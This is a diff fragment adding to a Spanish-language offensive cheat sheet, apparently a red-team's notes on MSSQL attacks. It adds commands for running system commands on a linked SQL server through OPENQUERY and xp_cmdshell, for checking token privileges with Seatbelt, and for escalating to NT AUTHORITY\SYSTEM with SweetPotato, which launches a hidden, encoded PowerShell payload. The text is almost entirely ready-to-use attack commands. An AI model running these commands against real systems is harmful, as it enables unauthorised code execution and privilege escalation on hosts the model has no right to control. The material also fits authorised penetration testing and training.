@@ -608,3 +608,16 @@ execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a
 ```
 powershell Get-SQLServerLinkCrawl -Instance "INSTANCIA1"
 ```
+Ejecutar codigo en el otro servidor
+```
+SELECT * FROM OPENQUERY("HOST", 'select @@servername; exec xp_cmdshell ''command''')
+```
+## MSSQL Privilege Escalation
+Mirar los privilegios actuales
+```
+execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe TokenPrivileges
+```
+Si puede impersonar a cualquier usuario se fuerza la autenticacion de un NT Authority\SYSTEM
+```
+execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "-w hidden -enc ..."
+```
